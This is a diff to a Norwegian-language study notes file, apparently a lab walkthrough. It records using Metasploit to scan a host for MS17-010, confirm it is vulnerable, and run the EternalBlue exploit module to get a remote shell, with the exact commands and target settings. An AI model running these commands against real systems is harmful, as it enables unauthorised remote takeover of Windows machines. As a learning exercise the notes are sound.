@@ -40,5 +40,21 @@ Siden jeg fant en exploit maskinen var utsatt for sookte jeg paa den i Metasploi
 search ms17_010
 #Tilbake fikk jeg en rekke forskjellige exploits opp og deres path. Path er viktig for aa kunne videre bruke exploiten mot utsatt maskin
 #Viktig aa legge merke til at resultatet fra sooket hadde exploits og auxilliary. Auxilliary er det scriptet eller whatever som sjekker om maskinen er utsatt
-#for exploiten eller ikke.
+
+Bruker auxilliary modulen i Metasploit til aa sjekke om utsatte maskin kan utnyttes med exploit:
+use auxilliary/scanner/smb/ms17_010_command	#Gaar over til auxilliary modulen
+show options					#viser hva som kan gjores i modulen, faar opp hva slags informasjon paa variablene som er paakrevd for aa bruke modulen
+						#for eksempel er det paakrevd i denne modulen aa angi variabelen RHOST som noe... med andre ord sett den til aa vaere utsatt maskin
+Setter paakrevd informasjon for variabler i modulen og deretter kjorer modulen:
+set RHOST 10.10.208.123			#Kan bruke get og set for aa leke med variablene.
+run					#Prover aa kjore programmet basert paa variablene. 
+Modulen kjorte og ga tilbake at maskin var:
+"Host is likely VULNERABLE"
+
+
+Gaar over til aa bruke exploit modulen for aa faktisk utnytte utsatt maskin:
+use exploit/windows/smb/ms17_010_eternalblue	#Gaar over til exploit modulen
+setg rhost 10.10.208.123			#Setter paakrevd variabel til aa vaere utsatt maskin, NB legg merke til "g" brukt i setg. Da er variabelen globalt for alle moduler
+run 						#Prover aa kjoore modulen, det ble vellykket og jeg fikk en terminal/shell ookt paa windows maskinen.
+
 
